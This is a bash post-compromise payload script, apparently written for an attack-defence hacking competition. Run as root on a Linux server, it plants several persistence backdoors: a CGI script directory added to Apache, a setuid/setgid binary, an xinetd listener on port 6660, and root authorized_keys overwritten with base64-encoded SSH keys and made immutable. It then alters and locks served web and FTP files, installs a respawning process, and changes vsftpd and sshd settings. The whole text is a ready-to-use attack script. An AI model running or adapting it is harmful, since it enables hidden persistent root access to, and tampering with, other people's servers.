#!/usr/bin/bash
# Sleek Payload
# by amon (amon@nandynarwhals.org)

# Step 1 - Extra Persistence
# 1. cgi folder in /usr/lib/yum-plugins, accessible at /cgi/ on 8080 or 8443
printf '\nScriptAlias /cgi/ "/usr/lib/yum-plugins/"\n\n<Directory "/usr/lib/yum-plugins/">\n    AllowOverride None\n    Options None\n    Order allow,deny\n    Allow from all\n</Directory>' >> /etc/httpd/conf/httpd.conf
# require cgibd.py as /usr/lib/yum-plugins/.gh
chmod +x /usr/lib/yum-plugins/.gh
service httpd restart
# 2. setuid binary
# require suid as /usr/lib/yum-plugins/sys
chmod +x /usr/lib/yum-plugins/sys
chmod u+s /usr/lib/yum-plugins/sys
chmod g+s /usr/lib/yum-plugins/sys
# 3. xinetd listener on 6660
chmod +x /usr/sbin/pyx
printf '\npyx\t\t6660/tcp\n' >> /etc/services
service xinetd restart
# 4. recheck the authorized_keys
cat /root/.ssh/authorized_keys | md5sum | grep 0975089eafc21739df2b9a9a930bc0ba || sh -c 'chattr -i /root/.ssh/authorized_keys; printf "c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBQkl3QUFBUUVBdndtK3YzZy9zMGxMWFJjb1BILzNhNysrbFlXb0V0cS8xMXlaNmdPTFZuRmdET3poUUVwdWZ3VHFUTmV0ekV3N0JDZW90cHo4WmlHK2ZHQVd2SWRtR2ZFckR6aTZ0dVpXV2o0dU9oMjBUL3NqaW1mNDBUR3BnZ21Dc2Z1TlNtMUFYMHMwdFhTWU9JcVBUMWdSMWZ6NzFrNFUvVWVaaFRpRW1GUXhHM2FTdTVTUnJuV0lKTmpZUkptL1JkL0pZUGFtcTYybG9CTS9vRzRqOG9mNjJoYmV2MnVhOWpnTC9FNkdKMDZZVXRvK1pwU0czWk1wem9tNnVWV1lWQytpbG5lQ0h2TXZNdjB0N2Zkck04STJTTnRrSGRHclVRT0tLcWFYM3FsRDZsM05Nc25DazhnWUR4UDlIOTQva1czWVFIMEZZdVUrbzh6QzVMUythNEJJS09JZ2N3PT0gcm9vdEBidApzc2gtcnNhIEFBQUFCM056YUMxeWMyRUFBQUFCSXdBQUFRRUE0dDFtRnp5UlJtWXFQY0I0T3k1V0o5aXVncmpVaFRudzRmdnBieS9VbmRGcUdWOExhWjN6L3BrY01hRnVnWjBiN3dmcnRDMWk2TTh2em00TjdKREsyYS9Eb0phMG1QVzZ3MHVaSHNTRDFZcmYvTUJPUG1rYy8xby9DVDR4N0hha1BSd2czZDBhUE5KcGVTaFUvUFZpUTg5UHFHM1VWOHdGb2p1ZGpmY0ZPN0NOM0tyenN4L0luTDJmQnJuQ2xmN1Z4UTNiWlEvdU45dXNOeW1lT0owbVg3YkVSbGlHbUtVVlVUMmJqTVNRNnNLc3JKdlNjbkpSem02dnYycTBueWlnZXRqcm1RQUZZZEhKSkU4QVdRN0l4bEtJSjA3eWpXS2duV3ZKNi83T2ZEZkxKdS9QNlBoNTNrSHhIdWthSHdQamZtR2QrOGVHTzZEaFpwVFllYW1lV1E9PSByb290QGJ0CnNzaC1yc2EgQUFBQUIzTnphQzF5YzJFQUFBQUJJd0FBQVFFQW95bVFtaDJad2tVd25OeGUwVlNtQWREcmJyb0Jud3JKTm1UaXpreDJDb09WbXgvTklOUENhejY4ZjFIZndFUnhKUmplTnorQUJ3dEZQaDVvcHJaU3kxRlBNeXdRR0lwa0I0WmcxVEVvMzVaQitaaWpxZEN4L0w4TFhBZnBCY29uUGRLc2c1VHViSmN6UjZFOTNTL0FRRnFFcWc2MTdHenZjam5QNmNFZGh4dHY5eUJXNGs2bHNUc0ZuOVpiQkxvSXU1ZDU5TmZNek5wNkREVThDdDZhVUlsWTVXY3BFb0JUZEZLSlFDaHRkaDRoaG4zVHhlbldkQnArUnRRNTBkdGF6SUcrWFVhVDlqdTVnMGpTVTRzVE40eVJSS2dYVlJNTzVyUFRWblJkZm5iRzNNTUdHV0xJM2NPdzd1cFQ3eGRhSlFBdmNmUEIrQTJyVlBYTloxRWptdz09IHJvb3RAYnQK" | base64 -d > /root/.ssh/authorized_keys; chattr +i /root/.ssh/authorized_keys'

# Step 2 - Sabotage
chattr -i /srv/www/htdocs/index.html
sed -i 's/service\./service. /g' /srv/www/htdocs/index.html
chmod -w /srv/www/htdocs/index.html
chattr +i /srv/www/htdocs/index.html
chattr -i /var/ftp/welcome.msg
sed -i 's/,//g' /var/ftp/welcome.msg
chmod -w /var/ftp/welcome.msg
chattr +i /var/ftp/welcome.msg
chattr -i /home/public/file
sed -i 's/ts/t/g' /home/public/file
chown root:root /home/public/file
chmod -w /home/public/file
chattr +i /home/public/file

# Step 3 - Maintain File Un-Integrity
chmod +x /usr/sbin/sulogin
printf "start on runlevel 3\n\nexec /usr/sbin/sulogin\nrespawn\n" > /etc/event.d/sulogin
chmod +x /etc/event.d/sulogin
initctl start sulogin

# Step 4 - Patch (one at a time~~)
mv /tmp/cache.1 /usr/local/sbin/vsftpd
chmod +x /usr/local/sbin/vsftpd
printf "\nuserlist_enable=YES\nuserlist_file=/etc/ftpusers\n" >> /etc/vsftpd.conf
sed -i 's/#PermitRootLogin yes/PermitRootLogin without-password/g' /etc/ssh/sshd_config
sed -i 's/PermitRootLogin yes/PermitRootLogin without-password/g' /etc/ssh/sshd_config
service sshd restart